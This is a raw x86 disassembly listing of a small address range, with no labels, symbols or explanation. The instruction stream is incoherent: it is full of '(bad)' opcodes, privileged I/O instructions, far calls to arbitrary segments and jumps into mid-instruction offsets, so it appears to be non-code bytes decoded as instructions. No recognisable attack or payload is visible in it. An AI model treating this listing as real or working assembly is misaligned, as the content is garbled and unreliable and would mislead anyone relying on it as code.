  41f3be:	arpl   ax,sp
  41f3c0:	mov    esp,DWORD PTR [ebx]
  41f3c2:	cld    
  41f3c3:	std    
  41f3c4:	data16 cmp ch,BYTE PTR [edi-0x63b75c30]
  41f3cb:	out    0xdf,eax
  41f3cd:	jno    0x41f3f6
  41f3cf:	adc    BYTE PTR [edi],ch
  41f3d1:	xchg   ebx,eax
  41f3d2:	mov    ch,0x3d
  41f3d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3d5:	jmp    0xb99fe279
  41f3da:	and    edx,0xffffffec
  41f3dd:	aaa    
  41f3de:	push   ss
  41f3df:	sub    ch,BYTE PTR [eax+0x35]
  41f3e2:	rol    DWORD PTR [ebx-0x3eb15962],1
  41f3e8:	clc    
  41f3e9:	(bad)  
  41f3ea:	push   ss
  41f3eb:	sbb    cl,bh
  41f3ed:	sub    bh,BYTE PTR [edx]
  41f3ef:	cmp    BYTE PTR [edi+0x6],0x72
  41f3f3:	sti    
  41f3f4:	adc    eax,0x234ff9d3
  41f3f9:	(bad)  
  41f3fa:	stc    
  41f3fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3fc:	sbb    al,BYTE PTR ds:0x89af392f
  41f402:	jno    0x41f385
  41f404:	sbb    edx,DWORD PTR [ebx-0x198b9018]
  41f40a:	icebp  
  41f40b:	inc    eax
  41f40c:	sub    ebp,ebx
  41f40e:	add    ah,BYTE PTR [eax+0x9]
  41f411:	jne    0x41f3ba
  41f413:	xor    BYTE PTR [edi-0x79],0xe0
  41f417:	mov    bh,0x9e
  41f419:	cwde   
  41f41a:	mov    dl,0xb4
  41f41c:	sbb    BYTE PTR [edi],bl
  41f41e:	cmp    edx,DWORD PTR [ebx-0x3f02bfc7]
  41f424:	mov    WORD PTR [edx],ss
  41f426:	push   ecx
  41f427:	and    DWORD PTR [ecx+0x150b951c],ecx
  41f42d:	pop    esi
  41f42e:	(bad)  
  41f42f:	repz mov eax,ds:0xeb1b607b
  41f435:	push   edx
  41f436:	lahf   
  41f437:	out    dx,al
  41f438:	call   0x53f6:0x7937e7d
  41f43f:	fwait
  41f440:	(bad)  
  41f441:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f443:	in     al,dx
  41f444:	stos   BYTE PTR es:[edi],al
  41f445:	xchg   edi,eax
  41f446:	cwde   
  41f447:	dec    edx
  41f448:	pop    edi
  41f449:	(bad)  
  41f44b:	call   0xdc19:0x270f7b47
  41f452:	mov    BYTE PTR [eax+0x42],bl
  41f455:	cmovne esi,ebp
  41f458:	cmp    DWORD PTR [edi+0x598edfe5],edx
  41f45e:	and    bl,BYTE PTR [eax-0x7cb18b4f]
  41f464:	shl    DWORD PTR [esi],cl
  41f466:	sahf   
  41f467:	and    ecx,DWORD PTR [eax-0x1c99e6a7]
  41f46d:	sbb    ch,BYTE PTR [ecx]
  41f46f:	pop    es
  41f470:	int    0xe1
  41f472:	clc    
  41f473:	add    ah,BYTE PTR ds:0x3224cb1f
  41f479:	or     DWORD PTR [edx+0x48e16023],edi
  41f47f:	pop    es
  41f480:	xchg   edx,eax
  41f481:	and    al,0x10
  41f483:	dec    edi
  41f484:	clc    
  41f485:	cmc    
  41f486:	mov    esi,0x7f7d32b7
  41f48b:	je     0x41f4ea
  41f48d:	hlt    
  41f48e:	xchg   BYTE PTR [ebx-0x10],bl
  41f491:	sbb    DWORD PTR [ecx-0x50],ebp
  41f494:	ins    DWORD PTR es:[edi],dx
  41f495:	(bad)  
  41f496:	enter  0x360b,0xa7
  41f49a:	retf   
  41f49b:	lock (bad) [edx]
  41f49e:	xchg   esp,eax
  41f49f:	test   bh,dh
  41f4a1:	mov    ch,BYTE PTR [esp+edx*4+0x480f986a]
  41f4a8:	enter  0x6e8c,0xa2
  41f4ac:	int    0x78
  41f4ae:	in     eax,dx
  41f4af:	pop    edx
  41f4b0:	loop   0x41f4a1
  41f4b2:	imul   edx,DWORD PTR ds:0x319040a1,0x6232df14
  41f4bc:	inc    ebx
  41f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4be:	cmp    BYTE PTR [ebx+0x6ffb9039],0x5d
  41f4c5:	inc    ebp
  41f4c6:	nop
  41f4c7:	or     DWORD PTR [esi],0x63d21c91
  41f4cd:	push   0x3
  41f4cf:	shl    DWORD PTR [eax+0x6c],cl
  41f4d2:	mov    ecx,0x64a3c7aa
  41f4d7:	dec    eax
  41f4d8:	adc    BYTE PTR [ebp+edx*1-0x44],0x1c
  41f4dd:	sbb    DWORD PTR [eax-0x20],0x835b56e5
  41f4e4:	call   0xf204:0x4dd7d8f9
  41f4eb:	aas    
  41f4ec:	test   eax,0xae9c8490
  41f4f1:	mov    edi,0x1dc0a75b
  41f4f6:	jo     0x41f534
  41f4f8:	dec    eax
  41f4f9:	(bad)  
  41f4fa:	add    al,BYTE PTR [ebp+0x54]
  41f4fd:	or     BYTE PTR [eax],0x85
  41f500:	jecxz  0x41f577
  41f502:	imul   ebp,DWORD PTR ds:[ebp+0x4742128b],0x69c00907
  41f50d:	aam    0xe3
  41f50f:	and    eax,0x41e64d51
  41f514:	mov    esi,DWORD PTR [edi+0x37]
  41f517:	add    cl,BYTE PTR [edx-0x7d]
  41f51a:	out    0xd8,al
  41f51c:	sbb    eax,0xbda52394
  41f521:	push   esi
  41f522:	inc    edi
  41f523:	mov    ds:0x32d396d4,al
  41f528:	jmp    DWORD PTR [edi-0x5342ee42]
  41f52e:	loope  0x41f53d
  41f530:	push   ss
  41f531:	or     eax,0x8bff67a4
  41f536:	jle    0x41f4f6
  41f538:	sbb    DWORD PTR [ebp-0xc],edx
  41f53b:	pop    ss
  41f53c:	adc    eax,0xd9ee0802
  41f541:	mov    ds:0xa7bd4442,al
  41f546:	aaa    
  41f547:	neg    ebx
  41f549:	pop    ss
  41f54a:	ret    0x6559
  41f54d:	ins    DWORD PTR es:[edi],dx
  41f54e:	mov    BYTE PTR [esi+0x52],dl
  41f551:	push   edi
  41f552:	or     DWORD PTR [ecx+0x5],esp
  41f555:	adc    edx,DWORD PTR [esi-0x50d42874]
  41f55b:	pop    es
  41f55c:	loop   0x41f574
  41f55e:	dec    eax
  41f55f:	or     DWORD PTR ds:0x46b2bcf9,0x30
  41f566:	fdivp  st(4),st
  41f568:	add    BYTE PTR ds:0x7f6bdb43,0x1f
  41f56f:	mov    bh,0x1a
  41f571:	push   ebx
  41f572:	test   BYTE PTR [esi-0x40],cl
  41f575:	(bad)  
  41f576:	sbb    dh,ah
  41f578:	sub    al,0xa1
  41f57a:	out    0x80,al
  41f57c:	(bad)  
  41f57e:	std    
  41f57f:	xchg   DWORD PTR [edx+ebx*8],edi
  41f582:	repz cmp dh,BYTE PTR [di]
  41f586:	inc    ebp
  41f587:	xchg   esp,eax
  41f588:	jno    0x41f50f
  41f58a:	(bad)  
  41f58b:	or     al,0x34
  41f58d:	sahf   
  41f58e:	inc    ebp
  41f58f:	mov    eax,ds:0x879d8fdb
  41f594:	sbb    ecx,DWORD PTR [eax-0x4a]
  41f597:	popf   
  41f598:	enter  0xd880,0x9c
  41f59c:	and    al,bl
  41f59e:	mov    esp,0xcc6521f7
  41f5a3:	in     al,0x57
  41f5a5:	add    al,0xd7
  41f5a7:	or     bh,BYTE PTR [ecx+0x2f]
  41f5aa:	idiv   BYTE PTR [edx+0x5f]
  41f5ad:	lea    edx,ds:[edx+0xf9af508]
  41f5b4:	int    0x3e
  41f5b6:	mov    edi,0x1306071d
  41f5bb:	pop    ecx
  41f5bc:	inc    ebx
  41f5bd:	jno    0x41f5d0
  41f5bf:	sahf   
  41f5c0:	fwait
  41f5c1:	cmp    cl,BYTE PTR [eax-0x26ca3fed]
  41f5c7:	(bad)
  41f5ca:	addr16 aas 
  41f5cc:	xchg   edi,eax
  41f5cd:	cvtdq2ps xmm4,XMMWORD PTR [edi-0x6a]
  41f5d1:	xor    eax,DWORD PTR [ebx]
  41f5d3:	fmulp  st(0),st
  41f5d5:	(bad)  
  41f5d6:	or     bh,cl
  41f5d8:	add    bh,BYTE PTR [ebp+0x6ea466d1]
  41f5de:	dec    ecx
  41f5df:	dec    edi
  41f5e0:	sbb    esp,ebx
  41f5e2:	arpl   WORD PTR [ebp+eax*4-0x67],dx
  41f5e6:	nop
  41f5e7:	nop
  41f5e8:	or     esp,eax
  41f5ea:	sbb    eax,esi
  41f5ec:	mov    cs,WORD PTR [ebx+edi*2]
  41f5ef:	dec    edx
  41f5f0:	pop    eax
  41f5f1:	jg     0x41f5ac
  41f5f3:	and    BYTE PTR [edx-0x22],0xb5
  41f5f7:	xor    bh,BYTE PTR [ebp+0x7a721966]
  41f5fd:	push   edi
  41f5fe:	adc    eax,0xb6b19ad6
  41f603:	(bad)  
  41f604:	mov    cl,0x9d
  41f606:	out    0xac,al
  41f608:	xchg   DWORD PTR [esi-0x2a96a40e],ebx
  41f60e:	lods   eax,DWORD PTR ds:[esi]
  41f60f:	push   esp
  41f610:	fild   QWORD PTR es:[ebp+esi*8+0xeefcd43]
  41f618:	dec    ecx
  41f619:	daa    
  41f61a:	push   0x20d09bd
  41f61f:	dec    ecx
  41f620:	aas    
  41f621:	xor    ah,BYTE PTR [edx-0x80]
  41f624:	test   al,0xbd
  41f626:	pop    ebx
  41f627:	xchg   DWORD PTR [ebx],ecx
  41f629:	or     al,0x3a
  41f62b:	stc    
  41f62c:	cld    
  41f62d:	inc    edi
  41f62e:	jl     0x41f5f1
  41f630:	push   ds
  41f631:	jg     0x41f5be
  41f633:	hlt    
  41f634:	xor    dl,BYTE PTR [eax]
  41f636:	hlt    
  41f637:	data16 mov al,0xb0
  41f63a:	outs   dx,DWORD PTR ds:[esi]
  41f63b:	jo     0x41f678
  41f63d:	fisttp WORD PTR [esi+edi*8+0x46d6ce72]
  41f644:	jns    0x41f665
  41f646:	jbe    0x41f611
  41f648:	push   edi
  41f649:	ret    0xd193
  41f64c:	sar    BYTE PTR [eax],cl
  41f64e:	xor    al,0x62
  41f650:	cli    
  41f651:	js     0x41f619
  41f653:	(bad)  [eax-0x319c0bb]
  41f659:	jmp    0x41f6ac
  41f65b:	scas   eax,DWORD PTR es:[edi]
  41f65c:	jecxz  0x41f685
  41f65e:	addr16 cld 
  41f660:	jg     0x41f69b
  41f662:	bound  edi,QWORD PTR [ebx+0x43b1bca0]
  41f668:	dec    eax
  41f669:	dec    ebp
  41f66a:	dec    esp
  41f66b:	xchg   edx,eax
  41f66c:	aaa    
  41f66d:	dec    ecx
  41f66e:	sub    ah,BYTE PTR [edx]
  41f670:	dec    ebp
  41f671:	and    edx,DWORD PTR [edx-0x20652938]
  41f677:	push   ss
  41f678:	adc    ecx,esp
  41f67a:	xchg   edi,eax
  41f67b:	mov    esi,DWORD PTR [ebp+0x4e3bf536]
  41f681:	data16 hlt 
  41f683:	jns    0x41f60d
  41f685:	xor    eax,0xb1ad7d9e
  41f68a:	cs push 0xc41b8b00
  41f690:	jg     0x41f69f
  41f692:	jmp    0x41f6d9
  41f694:	imul   ebp,esi,0x4d1b51ba
  41f69a:	int3   
  41f69b:	cmp    dl,BYTE PTR ds:[ebx]
  41f69e:	mov    dl,0xd6
  41f6a0:	mov    ebx,0xf91a9456
  41f6a5:	and    dh,bh
  41f6a7:	add    DWORD PTR es:0x7cb0b36,esi
  41f6ae:	adc    al,0xce
  41f6b0:	or     ecx,DWORD PTR [eax-0xdbd6902]
  41f6b6:	mov    ch,0xf2
  41f6b8:	mov    cl,BYTE PTR [eax]
  41f6ba:	cmp    dl,bl
  41f6bc:	retf   0xbf04
  41f6bf:	adc    bl,BYTE PTR [esi-0x4b]
  41f6c2:	sub    edx,DWORD PTR [ebp+0x38da26f2]
  41f6c8:	adc    edi,DWORD PTR [edx+0x5a6a6670]
  41f6ce:	orps   xmm4,XMMWORD PTR [edx-0x2e5715e0]
  41f6d5:	inc    edi
  41f6d6:	dec    ebx
  41f6d7:	neg    BYTE PTR [bx]
  41f6da:	dec    esi
  41f6db:	sbb    BYTE PTR [esi-0x4f],cl
  41f6de:	iret   
  41f6df:	add    al,0x89
  41f6e1:	or     eax,0x915f2899
  41f6e6:	aaa    
  41f6e7:	lds    eax,FWORD PTR [ebp-0x46]
  41f6ea:	inc    esi
  41f6eb:	push   es
  41f6ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6ed:	jge    0x41f69a
  41f6ef:	enter  0x241,0xa7
  41f6f3:	mov    ah,BYTE PTR [eax-0x19]
  41f6f6:	jbe    0x41f6cc
  41f6f8:	push   edx
  41f6f9:	icebp  
  41f6fa:	inc    eax
  41f6fb:	repz mov ebp,0x65a8b539
  41f701:	test   BYTE PTR [edx+esi*1],cl
  41f704:	(bad)  
  41f705:	neg    esi
  41f707:	push   ebp
  41f708:	shr    BYTE PTR [esi],1
  41f70a:	inc    ecx
  41f70b:	shl    DWORD PTR [ebx+0x12],0x2f
  41f70f:	xchg   esi,eax
  41f710:	(bad)  
  41f711:	cs mov eax,0xf6638a30
  41f717:	imul   edi,DWORD PTR [edi+0x1c],0x90b8449
  41f71e:	out    dx,al
  41f71f:	pop    ebx
  41f720:	cld    
  41f721:	fwait
  41f722:	(bad)  
  41f723:	in     eax,dx
  41f724:	inc    esp
  41f725:	les    ebx,FWORD PTR [ebx-0x58]
  41f728:	push   edx
  41f729:	imul   esi,DWORD PTR [edx+0x7b2fe1bd],0xd2ad7fe1
  41f733:	call   0xb9821375
  41f738:	dec    ecx
  41f739:	sti    
  41f73a:	jg     0x41f6f3
  41f73c:	out    0x74,eax
  41f73e:	jmp    0x16cd97ca
  41f743:	dec    eax
  41f744:	mov    ecx,0x488bf22
  41f749:	mov    ecx,0xa07ebbb7
  41f74e:	jge    0x41f7a6
  41f750:	fiadd  WORD PTR [eax+0x60]
  41f753:	dec    ebp
  41f754:	cwde   
  41f755:	ss cld 
  41f757:	add    ah,BYTE PTR [ecx-0x30]
  41f75a:	clc    
  41f75b:	lock (bad) 
  41f75d:	jle    0x41f79a
  41f75f:	iret   
  41f760:	test   ah,cl
  41f762:	xchg   esp,eax
  41f763:	in     eax,dx
  41f764:	dec    ebp
  41f766:	lahf   
  41f767:	sbb    al,0x5c
  41f769:	lahf   
  41f76a:	nop
  41f76b:	icebp  
  41f76c:	and    bl,BYTE PTR [ebx]
  41f76e:	repnz aas 
  41f770:	sub    eax,0x8e57f54
  41f775:	xchg   esi,eax
  41f776:	push   cs
  41f777:	clc    
  41f778:	mov    ah,0xaf
  41f77a:	jmp    DWORD PTR [eax+0x5b3e42f4]
  41f780:	pushf  
  41f781:	paddsb mm7,mm6
  41f784:	jle    0x41f7b3
  41f786:	jge    0x41f7a2
  41f788:	adc    eax,0xf699ceaf
  41f78d:	dec    edi
  41f78e:	(bad)  
  41f78f:	ds sahf 
  41f791:	sahf   
  41f792:	orps   xmm6,XMMWORD PTR [ebp-0x5a4d6684]
  41f799:	outs   dx,BYTE PTR es:[esi]
  41f79b:	fwait
  41f79c:	mov    ah,0xab
  41f79e:	loop   0x41f75a
  41f7a0:	loopne 0x41f7ef
  41f7a2:	adc    eax,0x11ce1573
  41f7a7:	add    ecx,DWORD PTR [esi+0x315466c4]
  41f7ad:	stc    
  41f7ae:	jo     0x41f7db
  41f7b0:	mov    al,ds:0x8e40c7d8
  41f7b5:	ss push eax
  41f7b7:	out    0xe1,eax
  41f7b9:	mov    edx,0x1aee413b
  41f7be:	xchg   dl,bh
  41f7c0:	sub    ch,BYTE PTR [ecx+0x3a0ddba5]
  41f7c6:	js     0x41f82e
  41f7c8:	xchg   ebp,eax
  41f7c9:	and    bh,BYTE PTR [ecx-0x12]
  41f7cc:	jge    0x41f7f0
  41f7ce:	sti    
  41f7cf:	push   ss
  41f7d0:	dec    edi
  41f7d1:	push   ebx
  41f7d2:	cmp    eax,DWORD PTR [esi]
  41f7d4:	ret    0xe020
  41f7d7:	or     edx,DWORD PTR [ecx+0x41047dfd]
  41f7dd:	mov    ecx,0x3a35d5c0
  41f7e2:	jmp    0x41f836
  41f7e4:	int    0xd5
  41f7e6:	cmp    ch,BYTE PTR [ebx+0x27]
  41f7e9:	mov    esi,0x6b650ada
  41f7ee:	aas    
  41f7ef:	dec    edx
  41f7f0:	dec    edi
  41f7f1:	rol    DWORD PTR [esi],cl
  41f7f3:	sub    DWORD PTR [eax],edi
  41f7f5:	inc    esi
  41f7f6:	sbb    eax,0xb0cdc6cf
  41f7fb:	lahf   
  41f7fc:	dec    ebx
  41f7fd:	xor    esp,DWORD PTR [esi+0x1f]
  41f800:	fstp   DWORD PTR [edi+ecx*2]
  41f803:	loop   0x41f881
  41f805:	add    eax,0x9aef15a
  41f80a:	call   0x7713b36c
  41f80f:	add    ebx,DWORD PTR [edx+0x3a]
  41f812:	inc    esi
  41f814:	add    al,0x77
  41f816:	add    eax,0x6356cf8e
  41f81b:	xor    BYTE PTR [esp+esi*1-0x2d1c232e],dh
  41f822:	sahf   
  41f823:	push   ss
  41f824:	pop    edi
  41f825:	xchg   ebx,eax
  41f826:	mov    cl,0x25
  41f828:	mov    bh,0x98
  41f82a:	sbb    edi,DWORD PTR [edi-0x4b]
  41f82d:	rcr    DWORD PTR [edx+edx*2+0x1],cl
  41f831:	mov    ds,ebp
  41f833:	jnp    0x41f85c
  41f835:	scas   al,BYTE PTR es:[edi]
  41f836:	jae    0x41f870
  41f838:	xchg   edx,eax
  41f839:	push   ebp
  41f83a:	enter  0x4a77,0x5a
  41f83e:	das    
  41f83f:	(bad)  
  41f840:	adc    BYTE PTR [eax+0x6a],cl
  41f843:	test   eax,0x80eedb2b
  41f848:	sub    eax,0x6abfb08d
  41f84d:	retf   
  41f84e:	mov    al,ds:0x89cb9c5d
  41f853:	mov    al,0x26
  41f855:	not    BYTE PTR [eax+0x5f20d30c]
  41f85b:	lods   al,BYTE PTR ss:[esi]
  41f85d:	retf   0x77fd
  41f860:	out    0xcf,al
  41f862:	add    dl,0x47
  41f865:	pushf  
  41f866:	xor    dl,BYTE PTR [di]
  41f869:	and    BYTE PTR [ecx],dl
  41f86b:	mov    ds:0xf1c812e4,al
  41f870:	push   0x1e
  41f872:	adc    bl,BYTE PTR [edx-0x2a]
  41f875:	loopne 0x41f80e
  41f877:	shr    dh,0x4f
  41f87a:	xchg   ebp,eax
  41f87b:	js     0x41f8a4
  41f87d:	into   
  41f87e:	push   0xffffff92
  41f880:	sub    BYTE PTR [edx-0x461d147d],dl
  41f886:	repnz xchg ebx,eax
  41f888:	xchg   ecx,eax
  41f889:	mov    ebp,0xc868f23b
  41f88e:	pop    ecx
  41f88f:	xchg   esi,eax
  41f890:	sbb    al,0x72
  41f892:	fcmovne st,st(1)
  41f894:	fs mov dh,0x87
  41f897:	test   eax,0xe7209951
  41f89c:	add    dl,BYTE PTR [esi]
  41f89e:	call   0x29ee:0xda4cf541
  41f8a5:	imul   esp,esp,0x9
  41f8a8:	and    BYTE PTR [eax+0x5121ccd],cl
  41f8ae:	loopne 0x41f8d1
  41f8b0:	icebp  
  41f8b1:	loope  0x41f88f
  41f8b3:	mov    al,0x60
  41f8b5:	stc    
  41f8b6:	and    esp,ecx
  41f8b8:	jp     0x9e54846d
  41f8be:	retf   
  41f8bf:	dec    edi
  41f8c0:	fs and esi,eax
  41f8c3:	push   esi
  41f8c4:	out    dx,al
  41f8c5:	sub    DWORD PTR [ecx-0x8],ebp
  41f8c8:	mov    ebx,0xc30e0414
  41f8cd:	mov    edx,0xbaaa3870
  41f8d2:	xchg   ebx,eax
  41f8d3:	mov    bh,0x9c
  41f8d5:	add    bh,dh
  41f8d7:	jo     0x41f933
  41f8d9:	dec    esi
  41f8da:	or     eax,0x97fc3885
  41f8df:	out    dx,eax
  41f8e0:	push   esp
  41f8e1:	(bad)  
  41f8e2:	ficomp WORD PTR [esi]
  41f8e4:	mov    ah,0x0
  41f8e6:	jmp    0x41f879
  41f8e8:	mov    bl,0x66
  41f8ea:	test   al,0xe2
  41f8ec:	enter  0x2c60,0x71
  41f8f0:	lahf   
  41f8f1:	sbb    DWORD PTR [eax+0x4b94fd34],0x55059fc2
  41f8fb:	push   ebx
  41f8fc:	dec    ecx
  41f8fd:	fwait
  41f8fe:	outs   dx,DWORD PTR ds:[esi]
  41f8ff:	ret    0x4f90
  41f902:	ret    
  41f903:	(bad)  
  41f904:	(bad)  
  41f905:	aam    0x13
  41f907:	push   edx
  41f908:	out    dx,al
  41f909:	jae    0x41f8b4
  41f90b:	pop    esp
  41f90c:	mov    ebp,0x7467ae49
  41f911:	xchg   edi,eax
  41f912:	inc    eax
  41f913:	sbb    ebp,DWORD PTR [ecx-0x1207e6bc]
  41f919:	cli    
  41f91a:	jp     0x41f8f5
  41f91c:	mov    ds:0x60fc09c7,eax
  41f921:	pushf  
  41f922:	repz push es
  41f924:	xchg   BYTE PTR [edx+0x30a94734],bh
  41f92a:	xor    edi,0xca2ef469
  41f930:	jo     0x41f8f6
  41f932:	cmp    al,0x8f
  41f934:	outs   dx,DWORD PTR ds:[esi]
  41f935:	sbb    DWORD PTR [ebp+0x6379930a],ebx
  41f93b:	imul   ecx,DWORD PTR [ecx-0x64e213b9],0x3b
  41f942:	int3   
  41f943:	add    bl,BYTE PTR [esi]
  41f945:	xor    dl,bl
  41f947:	cmp    dl,BYTE PTR [edi-0x3c9ed31e]
  41f94d:	jbe    0x41f95e
  41f94f:	aad    0x2e
  41f951:	fld    QWORD PTR [eax+0x28]
  41f954:	jle    0x41f912
  41f956:	mov    cl,0xe3
  41f958:	pop    esi
  41f959:	in     eax,dx
  41f95a:	pop    ecx
  41f95b:	lahf   
  41f95c:	and    bl,BYTE PTR [edx+0xe]
  41f95f:	or     ebp,DWORD PTR [ecx+0x7f]
  41f962:	sbb    DWORD PTR [ebx+0x71ea371c],ebx
  41f968:	sti    
  41f969:	mov    WORD PTR [ebp+0x34],es
  41f96c:	push   edx
  41f96d:	out    dx,al
  41f96e:	cmp    DWORD PTR [edi-0x7023f3bb],ebp
  41f974:	in     eax,0x22
  41f976:	xchg   esp,eax
  41f977:	mov    al,0x4f
  41f979:	and    DWORD PTR [eax+0x36],esp
  41f97c:	aas    
  41f97d:	shl    DWORD PTR [eax+0x581ed581],1
  41f983:	mov    eax,0x5ea022fb
  41f988:	cmp    ebx,DWORD PTR [ecx+0x27]
  41f98b:	push   cs
  41f98c:	test   BYTE PTR [edi],0x17
  41f98f:	xchg   edx,eax
  41f990:	adc    DWORD PTR [edx+0x5],ebx
  41f993:	and    eax,0xf47406b1
  41f998:	retf   0xf35f
  41f99b:	aas    
  41f99c:	mul    edi
  41f99e:	lods   eax,DWORD PTR ds:[esi]
  41f99f:	inc    esi
  41f9a0:	imul   edx,DWORD PTR [edi+eax*2-0x2f],0x20
  41f9a5:	jge    0x41f995
  41f9a7:	jo     0x41f9ec
  41f9a9:	add    al,0x75
  41f9ab:	xchg   edx,eax
  41f9ac:	stos   DWORD PTR es:[edi],eax
  41f9ad:	stc    
  41f9ae:	in     al,0xcf
  41f9b0:	add    BYTE PTR [edi-0x2c],cl
  41f9b3:	jb     0x41f9f4
  41f9b5:	pop    esi
  41f9b6:	(bad)  [edx+0x30]
  41f9b9:	mov    edi,0xfd4ff156
  41f9be:	ret    0x6fb4
  41f9c1:	dec    ebp
  41f9c2:	sub    DWORD PTR [eax+0x6e],edx
  41f9c5:	push   DWORD PTR [edi+0x3]
  41f9c8:	mov    edx,0xf259e30e
  41f9cd:	sbb    cl,BYTE PTR [ebx+0x5f]
  41f9d0:	push   es
  41f9d1:	sub    eax,0x2a74d985
  41f9d6:	push   ebx
  41f9d7:	aas    
  41f9d8:	stc    
  41f9d9:	test   eax,0x568774b1
  41f9de:	popf   
  41f9df:	pop    edi
  41f9e0:	sub    al,0xf9
  41f9e2:	cli    
  41f9e3:	jl     0x41f972
  41f9e5:	mov    ebp,0x62772e17
  41f9ea:	aam    0xdc
  41f9ec:	ja     0x41fa57
  41f9ee:	cmp    eax,0x66255fe5
  41f9f3:	ss scas eax,DWORD PTR es:[edi]
  41f9f5:	or     DWORD PTR [ebx],0x9f5f32f4
  41f9fb:	daa    
  41f9fc:	(bad)  
  41f9fd:	jb     0x41fa0d
  41f9ff:	pop    ds
  41fa00:	mov    cl,0x61
  41fa02:	inc    edx
  41fa03:	add    DWORD PTR [edx-0x27d291b4],edi
  41fa09:	push   esi
  41fa0a:	pop    esp
  41fa0b:	mov    BYTE PTR [ebp+0x5c54a200],dh
  41fa11:	addr16 inc esp
  41fa13:	nop
  41fa14:	adc    ebx,DWORD PTR [esi+0x50]
  41fa17:	enter  0x8f9f,0x2c
  41fa1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa1c:	arpl   WORD PTR [ebx+edx*1],si
  41fa1f:	xchg   esi,eax
  41fa20:	repz sub eax,0x13e818c6
  41fa26:	outs   dx,BYTE PTR ds:[esi]
  41fa27:	xor    DWORD PTR [esi+edi*1+0x2a3ab660],ecx
  41fa2e:	adc    eax,0x5e61b0f1
  41fa33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa34:	push   edx
  41fa35:	fdiv   st,st(4)
  41fa37:	pop    eax
  41fa38:	push   ss
  41fa39:	add    eax,0x38fa99d0
  41fa3e:	mov    WORD PTR [ebx+eax*2-0x30],fs
  41fa42:	xor    cl,BYTE PTR [ebp-0x490e1a50]
  41fa48:	adc    edi,DWORD PTR [ecx+0x580e3cc0]
  41fa4e:	stos   BYTE PTR es:[edi],al
  41fa4f:	pop    ss
  41fa50:	test   BYTE PTR [edi+esi*1-0x6f59019],0x56
  41fa58:	lahf   
  41fa59:	in     al,dx
  41fa5a:	cmc    
  41fa5b:	cli    
  41fa5c:	int3   
  41fa5d:	imul   ebx
  41fa5f:	retf   
  41fa60:	xor    DWORD PTR [ebx],esp
  41fa62:	mov    edx,DWORD PTR [eax]
  41fa64:	loope  0x41fac2
  41fa66:	lods   al,BYTE PTR ds:[esi]
  41fa67:	mov    ebx,0x9d4cb378
  41fa6c:	pop    ds
  41fa6d:	mov    gs,WORD PTR [esi+edx*1-0x61]
  41fa71:	scas   al,BYTE PTR es:[edi]
  41fa72:	aaa    
  41fa73:	stc    
  41fa74:	(bad)  
  41fa75:	(bad)  
  41fa76:	sti    
  41fa77:	and    edx,DWORD PTR [esi-0x45548134]
  41fa7d:	call   0x51b2:0x30398278
  41fa84:	aam    0xa5
  41fa86:	inc    esp
  41fa87:	push   0xf8536509
  41fa8c:	mov    al,ds:0x4d891cb2
  41fa91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa93:	pop    edx
  41fa94:	inc    ebp
  41fa95:	xor    al,0x5b
  41fa97:	dec    edx
  41fa98:	add    eax,0xd9a29a38
  41fa9d:	dec    eax
  41fa9e:	dec    eax
  41fa9f:	jbe    0x41fb01
  41faa1:	jle    0x41fae1
  41faa3:	fstp   DWORD PTR [ebx+0x4e]
  41faa6:	aaa    
  41faa7:	retf   0x44be
  41faaa:	dec    esp
  41faab:	jmp    0x9c72:0x8a9834b
  41fab2:	push   0x60
  41fab4:	cmp    BYTE PTR [ebp+0x13f9ac66],bh
  41faba:	test   ecx,ebp
  41fabc:	iret   
  41fabd:	add    esp,edi
  41fabf:	mov    eax,ds:0xd62ecc0b
  41fac4:	mov    eax,0xc480794c
  41fac9:	push   esp
  41faca:	mov    esi,0xd4747969
  41facf:	shr    BYTE PTR [esi+0x5d],0x24
  41fad3:	push   edx
  41fad4:	push   ebp
  41fad5:	xor    bh,BYTE PTR [ebx+0x11445ce6]
  41fadb:	mov    ss,WORD PTR [ebx+0x1317cb75]
  41fae1:	ins    DWORD PTR es:[edi],dx
  41fae2:	clc    
  41fae3:	dec    esp
  41fae4:	mov    dh,0xa
  41fae6:	imul   ecx,DWORD PTR [edi+0x44f72b4b],0x848ff354
  41faf0:	inc    edx
  41faf1:	stc    
  41faf2:	fild   QWORD PTR [ebx]
  41faf4:	fisttp DWORD PTR [ebx+0x441a4f5d]
  41fafa:	sbb    ah,BYTE PTR [eax]
  41fafc:	leave  
  41fafd:	lods   al,BYTE PTR ds:[esi]
  41fafe:	adc    al,0x6
  41fb00:	add    esi,esp
  41fb02:	aam    0x13
  41fb04:	or     al,0x8a
  41fb06:	pop    ebx
  41fb07:	push   cs
  41fb08:	push   ebp
  41fb09:	dec    ebx
  41fb0a:	mov    eax,0x3ffa25a9
  41fb0f:	cmp    al,0xc2
  41fb11:	cmp    BYTE PTR [esi],bl
  41fb13:	dec    esi
  41fb14:	pusha  
  41fb15:	pop    esp
  41fb16:	arpl   WORD PTR [edx],cx
  41fb18:	outs   dx,BYTE PTR ds:[esi]
  41fb19:	mov    ebx,0xac685633
  41fb1e:	aas    
  41fb1f:	sahf   
  41fb20:	mov    edi,0x97c0cf73
  41fb25:	pop    esi
  41fb26:	pusha  
  41fb27:	shl    ah,cl
  41fb29:	and    eax,0xad054135
  41fb2e:	sub    eax,0xf562d3de
  41fb33:	repz int3 
  41fb35:	arpl   WORD PTR [ecx-0x3d],dx
  41fb38:	jg     0x41fb8b
  41fb3a:	clc    
  41fb3b:	or     DWORD PTR [esi-0x38],edi
  41fb3e:	dec    esi
  41fb3f:	loop   0x41facf
  41fb41:	in     al,dx
  41fb42:	nop
  41fb43:	inc    eax
  41fb44:	ins    DWORD PTR es:[edi],dx
  41fb45:	in     al,dx
  41fb46:	or     BYTE PTR ds:[ebp-0x6e],cl
  41fb4a:	addr16 (bad) 
  41fb4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb4d:	push   ds
  41fb4e:	push   ss
  41fb4f:	jae    0x41fafa
  41fb51:	(bad)  
